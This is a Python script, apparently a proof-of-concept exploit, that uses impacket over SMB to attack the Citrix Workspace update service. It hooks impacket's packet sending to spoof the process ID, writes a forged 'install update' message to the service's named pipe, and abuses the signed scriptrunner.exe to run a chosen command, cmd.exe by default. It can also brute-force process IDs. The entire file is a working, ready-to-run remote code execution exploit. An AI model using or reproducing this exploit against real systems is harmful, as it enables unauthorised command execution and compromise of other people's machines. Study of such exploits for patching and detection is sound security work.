import argparse
import sys
import logging
import time
import re
import json
import types
from impacket.examples import logger
from impacket.smbconnection import SMBConnection
from impacket.smb import SMB_DIALECT, SMB
from impacket.smb3structs import SMB2_CREATE, SMB2_SESSION_FLAG_ENCRYPT_DATA

cru_pid = None
sendSMB_Original = None


def getData_Hooked(self, original):
    original['Pid'] = cru_pid
    return original.orignalGetData()


def sendSMB_Hooked(original, packet):

    global sendSMB_Original

    # Some ugly hacks here, essentially we are hooking
    # some original SMB1/2 function from impacket so we
    # can intercept the calls and patch the PID at the correct point

    if packet['Command'] is SMB2_CREATE:  # SMB2/3
        # If the command type is create for opening files/named pipes
        # then replace the Reserved (PID) field with our spoofed PID
        packet["Reserved"] = cru_pid
    elif packet['Command'] is SMB.SMB_COM_NT_CREATE_ANDX:  # SMB1
        # Additional level of hooks here since SMB1 packets are
        # handled differently, and in fact the impacket does use
        # the real process PID of the client, so we need to override
        # that behavior
        packet.orignalGetData = packet.getData
        packet.getData = types.MethodType(getData_Hooked, packet)

    # Send our packet using original sendSMB function
    sendSMB_Original(packet)


def openPipe(s, tid, pipe, accessMask):
    pipeReady = False
    tries = 50
    while pipeReady is False and tries > 0:
        try:
            s.waitNamedPipe(tid,pipe)
            pipeReady = True
        except Exception as e:
            print(str(e))
            tries -= 1
            time.sleep(2)
            pass

    if tries == 0:
        raise Exception('Pipe not ready, aborting')

    fid = s.openFile(tid, pipe, accessMask, creationOption=0x40, fileAttributes=0x80)

    return fid


def twos_comp(val, bits):
    """compute the 2's complement of int value val"""
    if (val & (1 << (bits - 1))) != 0: # if sign bit is set e.g., 8bit: 128-255
        val = val - (1 << bits)        # compute negative value
    return val                         # return positive value as is


def attemptExecution(smbClient, tid, pid, cmd, update_hash):

    logging.info('Attempting to connect to Citrix Update Service pipe')

    fid = openPipe(smbClient, tid, r'\UpdaterServicePipe-800fad42-1d0f-4f66-8e18-8a0938cdc721', 0x12019f)

    logging.info('Successfully opened pipe')

    namedPipeMessage = {
        # We want to install an update
        "MessageType": 1,
        # Signed executable that supports execution of other binaries (Signed Binary Proxy Execution)
        "UpdateFilePath": "c:\\windows\\sysnative\\scriptrunner.exe",
        # SHA256 hash of scriptrunner.exe, could be different for various OSes/patch level
        "UpdateFileHash": "%s" % update_hash,
        # Just execute, not interested in waiting for the result
        "InstallationTriggerBehavior": 1,
        # Command line arguments to pass to scriptrunner, arg[0] = executing program
        "CmdLineArguments": 'c:\\windows\\sysnative\\scriptrunner.exe -appvscript %s' % cmd
    }

    logging.info('Attempting to send install update command spoofing PID %d' % pid)
    response = None

    try:
        smbClient.writeNamedPipe(tid, fid, json.dumps(namedPipeMessage) + '\n', True)
        logging.info('Write to pipe succeeded, reading response...')
        response = json.loads(smbClient.readNamedPipe(tid, fid))

    except Exception as e:
        response = e

    finally:

        smbClient.closeFile(tid, fid)

        if response is not None and isinstance(response, dict) and response['ExitCode'] is not None:
            exitCode = twos_comp(response['ExitCode'], 31)
            if exitCode >= 0:
                logging.info('Command executed successfully, enjoy!')
                return True
            else:
                # Unfortunately -1 could come from a hash mismatch, token errors or
                # process launching errors (bad path or not signed).  We don't wait for the program to exit,
                # so it doesn't represent the exit code of the process.
                logging.error('Command execution failed with error %d', exitCode)
        else:
            logging.error('Command execution failed with exception %s, probably wrong PID', str(response))

        return False


def main():

    global cru_pid, sendSMB_Original

    logger.init()

    parser = argparse.ArgumentParser(add_help=True, description="SMB client implementation.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-pid', action="store", nargs='?', type=int, help='the PID of CitrixReceiverUpdater.exe')
    parser.add_argument('-max-pid', action="store", nargs='?', type=int, default=50000,
                        help='the highest PID to use when in PID cycling mode (default: 50000)')
    parser.add_argument('-command', action='store', default="c:\\windows\\system32\\cmd.exe",
                        help='The command to execute, (Default: c:\\windows\\system32\\cmd.exe)')
    parser.add_argument('-update-hash', action='store', default='24f4845c08b5629c78de41c46411404ec822390f54431205e66d212e620e4f64')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    cru_pid = options.pid

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    # In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    try:
        smbClient = SMBConnection(address, options.target_ip, sess_port=int(options.port))

        # Store our original sendSMB function for later use
        sendSMB_Original = smbClient._SMBConnection.sendSMB
        # Hook the sendSMB function ready for interception
        smbClient._SMBConnection.sendSMB = types.MethodType(sendSMB_Hooked, smbClient._SMBConnection)

        if options.k is True:
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, options.aesKey, options.dc_ip)
        else:
            smbClient.login(username, password, domain, lmhash, nthash)

        if smbClient.getDialect() != SMB_DIALECT:
            # Let's disable SMB3 Encryption for now
            smbClient._SMBConnection._Session['SessionFlags'] &= ~SMB2_SESSION_FLAG_ENCRYPT_DATA

        logging.info('Attempting to connect to IPC$')

        tid = smbClient.connectTree('IPC$')

        logging.info('Connected to IPC$')

        if cru_pid is not None:
            attemptExecution(smbClient, tid, cru_pid, options.command, options.update_hash)
        else:
            logging.info("Attempting to exploit using PID cycling mode with max PID %d", options.max_pid)
            logging.disable(logging.ERROR)
            cru_pid = 4
            while cru_pid < options.max_pid and attemptExecution(smbClient, tid, cru_pid, options.command,
                                                                 options.update_hash) is False:
                cru_pid += 4

            logging.disable(logging.DEBUG)
            if cru_pid < options.max_pid:
                logging.info("Successfully launched program using pid %d", cru_pid)
            else:
                logging.info("Exhausted PID search range, Citrix Workspace Updates might not be running")

        smbClient.close()

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))


if __name__ == "__main__":
    main()


